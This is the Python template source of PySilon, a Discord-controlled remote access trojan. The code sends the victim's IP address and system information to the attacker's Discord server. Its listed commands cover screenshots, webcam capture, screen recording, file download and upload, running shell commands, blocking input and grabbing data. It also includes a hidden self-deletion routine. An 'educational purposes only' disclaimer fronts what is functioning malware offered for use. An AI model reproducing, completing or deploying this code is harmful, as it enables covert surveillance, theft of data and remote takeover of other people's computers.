
# !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! #
# !!  DON'T COMPILE OR RUN THIS FILE. IT WILL NOT WORK. INSTEAD, RUN PySilon.bat AND AFTER CLICKING 'COMPILE'  !! #
# !!  YOU CAN TEST BY RUNNING source_prepared.py (THIS IS THE FINAL VERSON OF SOURCE CODE BEFORE COMPILING)    !! #
# !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! #

###############################################################################
##                                                                           ##
##   DISCLAIMER !!! READ BEFORE USING                                        ##
##                                                                           ##
##   Information and code provided in this project are                       ##
##   for educational purposes only. The creator is no                        ##
##   way responsible for any direct or indirect damage                       ##
##   caused due to the misusage of the information.                          ##
##                                                                           ##
##   Everything you do, you are doing at your own risk and responsibility.   ##
##                                                                           ##
###############################################################################

# [pysilon_var] $modules 0
from urllib.request import urlopen
from itertools import islice
from resources.misc import *
from getpass import getuser
from shutil import rmtree
import subprocess
import discord
import asyncio
import sys
import os
import time
auto = 'auto'

#
#
#    READ BEFORE TESTING!
#
#    1. If you encounter any errors, please let me know and I will be more than happy to help. [https://github.com/mategol/PySilon-malware/issues/new/choose]
#    2. I highly SUGGEST you to test compiled executable on Virtual Machnine before you will "give it a use".
#       If there would be any errors (probably wont but it's still freaking Windows), I could fix them for you.
#
#    HOW TO COMPILE:
#
#    start PySilon.bat
#
#

#####################################################################
## Following settings are configured by the builder.py by itself   ##
## Please do not touch basically anything to avoid unwanted errors ##
bot_tokens = []                                                    ##
software_registry_name = ''                                        ##
software_directory_name = ''                                       ##
software_executable_name = ''                                      ##
channel_ids = {                                                    ##
    'info': auto,                                                  ##
    'main': auto,                                                  ##
    'spam': auto,                                                  ##
    'file': auto,                                                  ##
    'recordings': auto,                                            ##
    'voice': auto                                                  ##
}                                                                  ##
secret_key = ''                                                    ##
guild_id = auto                                                    ##
## If you like this project, please leave me a Star on GitHub ;)   ##
#####################################################################

client = discord.Client(intents=discord.Intents.all())
# [pysilon_var] !opus_initialization 0
    
ctrl_codes = {'\\x01': '[CTRL+A]', '\\x02': '[CTRL+B]', '\\x03': '[CTRL+C]', '\\x04': '[CTRL+D]', '\\x05': '[CTRL+E]', '\\x06': '[CTRL+F]', '\\x07': '[CTRL+G]', '\\x08': '[CTRL+H]', '\\t': '[CTRL+I]', '\\x0A': '[CTRL+J]', '\\x0B': '[CTRL+K]', '\\x0C': '[CTRL+L]', '\\x0D': '[CTRL+M]', '\\x0E': '[CTRL+N]', '\\x0F': '[CTRL+O]', '\\x10': '[CTRL+P]', '\\x11': '[CTRL+Q]', '\\x12': '[CTRL+R]', '\\x13': '[CTRL+S]', '\\x14': '[CTRL+T]', '\\x15': '[CTRL+U]', '\\x16': '[CTRL+V]', '\\x17': '[CTRL+W]', '\\x18': '[CTRL+X]', '\\x19': '[CTRL+Y]', '\\x1A': '[CTRL+Z]'}
text_buffor, force_to_send = '', False
messages_to_send, files_to_send, embeds_to_send = [], [], []
processes_messages, processes_list, process_to_kill = [], [], ''
files_to_merge, expectation, one_file_attachment_message = [[], [], []], None, None
cookies_thread, implode_confirmation, cmd_messages = None, None, []
send_recordings = True
latest_messages_in_recordings = []
# [pysilon_var] !registry 0

working_directory = ['C:', 'Users', getuser(), software_directory_name]

@client.event
async def on_ready():
    global force_to_send, messages_to_send, files_to_send, embeds_to_send, channel_ids, cookies_thread, latest_messages_in_recordings
    hwid = subprocess.check_output('wmic csproduct get uuid', shell=True).decode().split('\n')[1].strip()

    first_run = True
    for category_name in client.get_guild(guild_id).categories:
        if hwid in str(category_name):
            first_run, category = False, category_name
            break

    if not first_run:
        category_channel_names = []
        for channel in category.channels:
            category_channel_names.append(channel.name)
        
        if 'spam' not in category_channel_names and channel_ids['spam']: 
            temp = await client.get_guild(guild_id).create_text_channel('spam', category=category)
            channel_ids['spam'] = temp.id
        
        if 'recordings' not in category_channel_names and channel_ids['recordings']: 
            temp = await client.get_guild(guild_id).create_text_channel('recordings', category=category)
            channel_ids['recordings'] = temp.id

        if 'file-related' not in category_channel_names and channel_ids['file']: 
            temp = await client.get_guild(guild_id).create_text_channel('file-related', category=category)
            channel_ids['file'] = temp.id
        
        if 'Live microphone' not in category_channel_names and channel_ids['voice']: 
            temp = await client.get_guild(guild_id).create_voice_channel('Live microphone', category=category)
            channel_ids['voice'] = temp.id
        
    if first_run:
        category = await client.get_guild(guild_id).create_category(hwid)
        temp = await client.get_guild(guild_id).create_text_channel('info', category=category); channel_ids['info'] = temp.id
        temp = await client.get_guild(guild_id).create_text_channel('main', category=category); channel_ids['main'] = temp.id
        if channel_ids['spam'] == True: temp = await client.get_guild(guild_id).create_text_channel('spam', category=category); channel_ids['spam'] = temp.id
        if channel_ids['recordings'] == True: temp = await client.get_guild(guild_id).create_text_channel('recordings', category=category); channel_ids['recordings'] = temp.id
        if channel_ids['file'] == True: temp = await client.get_guild(guild_id).create_text_channel('file-related', category=category); channel_ids['file'] = temp.id
        if channel_ids['voice'] == True: temp = await client.get_guild(guild_id).create_voice_channel('Live microphone', category=category); channel_ids['voice'] = temp.id

        await client.get_channel(channel_ids['info']).send('```IP address: ' + urlopen('https://ident.me').read().decode('utf-8') + ' [ident.me]```')
        await client.get_channel(channel_ids['info']).send('```IP address: ' + urlopen('https://ipv4.lafibre.info/ip.php').read().decode('utf-8') + ' [lafibre.info]```')
        system_info = force_decode(subprocess.run('systeminfo', capture_output= True, shell= True).stdout).strip().replace('\\xff', ' ')
        chunk = ''
        for line in system_info.split('\n'):
            if len(chunk) + len(line) > 1990:
                await client.get_channel(channel_ids['info']).send('```' + chunk + '```')
                chunk = line + '\n'
            else:
                chunk += line + '\n'
        await client.get_channel(channel_ids['info']).send('```' + chunk + '```')


    else:
        for channel in category.channels:
            if channel.name == 'info': channel_ids['info'] = channel.id
            elif channel.name == 'main': channel_ids['main'] = channel.id
            elif channel.name == 'spam': channel_ids['spam'] = channel.id
            elif channel.name == 'file-related': channel_ids['file'] = channel.id
            elif channel.name == 'recordings': channel_ids['recordings'] = channel.id
            elif channel.name == 'Live microphone': channel_ids['voice'] = channel.id

    await client.get_channel(channel_ids['main']).send('_ _\n_ _\n_ _```Starting new PC session at ' + current_time(True) + ' on HWID:' + str(hwid) + '```\n_ _\n_ _\n_ _')

# [pysilon_var] !recording_startup 1
    
    while True:
        global send_recordings
        recordings_obj = client.get_channel(channel_ids['recordings'])
        async for latest_message in recordings_obj.history(limit=2):
            latest_messages_in_recordings.append(latest_message.content)
        if 'disable' in latest_messages_in_recordings:
            send_recordings = False
        else:
            send_recordings = True

        latest_messages_in_recordings = []
        if len(messages_to_send) > 0:
            for message in messages_to_send:
                await client.get_channel(message[0]).send(message[1])
                await asyncio.sleep(0.1)
            messages_to_send = []
        if len(files_to_send) > 0:
            for file in files_to_send:
                await client.get_channel(file[0]).send(file[1], file=discord.File(file[2], filename=file[2]))
                await asyncio.sleep(0.1)
                if file[3]:
                    subprocess.run('del ' + file[2], shell=True)
            files_to_send = []
        if len(embeds_to_send) > 0:
            for embedd in embeds_to_send:
                await client.get_channel(embedd[0]).send(embed=discord.Embed(title=embedd[1], color=0x0084ff).set_image(url='attachment://' + embedd[2]), file=discord.File(embedd[2]))
                await asyncio.sleep(0.1)
            embeds_to_send = []
# [pysilon_var] !cookies_submit 2
        await asyncio.sleep(1)

@client.event
async def on_raw_reaction_add(payload):
    message = await client.get_channel(payload.channel_id).fetch_message(payload.message_id)
    reaction = discord.utils.get(message.reactions, emoji=payload.emoji.name)
    user = payload.member
  
    if user.bot == False:
        if str(reaction) == '📌':
            if message.channel.id in channel_ids.values():
                await message.pin()
                last_message = await discord.utils.get(message.channel.history())
                await last_message.delete()
        elif str(reaction) == '🔴':
            await message.delete()

@client.event
async def on_reaction_add(reaction, user):
    global tree_messages, messages_from_sending_big_file, expectation, files_to_merge, processes_messages, process_to_kill, expectation, cmd_messages
    if user.bot == False:
        if reaction.message.channel.id in channel_ids.values():
            try:
                if str(reaction) == '💀' and expectation == 'implosion':
                    await reaction.message.channel.send('```PySilon will try to implode after sending this message. So if there\'s no more messages, the cleanup was successful.```')
# [pysilon_var] !registry_implosion 5
                    secure_delete_file(filename, 10)
                    try: rmtree('rec_')
                    except: pass
                    with open(f'C:\\Users\\{getuser()}\\implode.bat', 'w', encoding='utf-8') as imploder:
                        imploder.write(f'pushd "C:\\Users\\{getuser()}"\ntaskkill /f /im "{software_executable_name}"\ntimeout /t 3 /nobreak\nrmdir /s /q "C:\\Users\\{getuser()}\\{software_directory_name}"\ndel "%~f0"')
                    subprocess.Popen(f'C:\\Users\\{getuser()}\\implode.bat', creationflags=subprocess.CREATE_NO_WINDOW)
                    sys.exit(0)
                elif str(reaction) == '🔴' and expectation == 'implosion':
                    expectation = None
# [pysilon_var] on reaction add 4
            except Exception as err: await reaction.message.channel.send(f'```{str(err)}```')

@client.event
async def on_raw_reaction_remove(payload):
    message = await client.get_channel(payload.channel_id).fetch_message(payload.message_id)
    reaction = discord.utils.get(message.reactions, emoji=payload.emoji.name)
    user = payload.member

    if str(reaction) == '📌':
        await message.unpin()

@client.event
async def on_message(message):
    global channel_ids, vc, working_directory, tree_messages, messages_from_sending_big_file, files_to_merge, expectation, one_file_attachment_message, processes_messages, processes_list, process_to_kill, cookies_thread, implode_confirmation, cmd_messages, keyboard_listener, mouse_listener, filename
    if message.author != client.user:
        if message.channel.id in channel_ids.values():
            if message.content == '.implode':
                await message.delete()
                await message.channel.send('``` `````` `````` `````` `````` `````` `````` `````` `````` `````` `````` `````` `````` `````` `````` `````` `````` `````` `````` `````` ```\n\n```Send here PySilon.key generated along with RAT executable```\n\n')
                expectation = 'key'
            
            elif message.content == '.restart':
                await message.delete()
                await message.channel.send('```PySilon will be restarted now... Stand by...```')
                os.startfile(f'C:\\Users\\{getuser()}\\{software_directory_name}\\{software_executable_name}')
                sys.exit(0)
                
            elif message.content[:5] == '.help':
                await message.delete()
                if message.content.strip() == '.help':
                    reaction_msg = await message.channel.send('```List of all commands:\n.ss\n.join\n.show [what-to-show]\n.kill [process-id]\n.grab [what-to-grab]\n.clear\n.pwd\n.tree\n.ls\n.download [file-or-dir]\n.upload [anonfiles-link]\n.execute [file]\n.remove [file-or-dir]\n.implode\n.webcam photo\n.screenrec\n.block-input\n.unblock-input\n.cmd [command]\n.cd [dir]\nDetailed List here: https://github.com/mategol/PySilon-malware/wiki/Commands```'); await reaction_msg.add_reaction('🔴')
            
            elif expectation == 'key':
                try:
                    split_v1 = str(message.attachments).split("filename='")[1]
                    filename = str(split_v1).split("' ")[0]
                    filename = f'C:\\Users\\{getuser()}\\{software_directory_name}\\' + filename
                    await message.attachments[0].save(fp=filename)
                    if get_file_hash(filename) == secret_key:
                        reaction_msg = await message.channel.send('```You are authorized to remotely remove PySilon RAT from target PC. Everything related to PySilon will be erased after you confirm this action by reacting with "💀".\nWARNING! This cannot be undone after you decide to proceed. You can cancel it, by reacting with "🔴".```')
                        await reaction_msg.add_reaction('💀')
                        await reaction_msg.add_reaction('🔴')
                        expectation = 'implosion'
                    else:
                        reaction_msg = await message.channel.send('```❗ Provided key is invalid```'); await reaction_msg.add_reaction('🔴')
                        expectation = None
                except Exception as err: 
                    await message.channel.send(f'```❗ Something went wrong while fetching secret key...\n{str(err)}```')
                    expectation = None

# [pysilon_var] on message 3

# [pysilon_var] on message end 3

# [pysilon_var] anywhere 0
 
# [pysilon_var] bottom 0
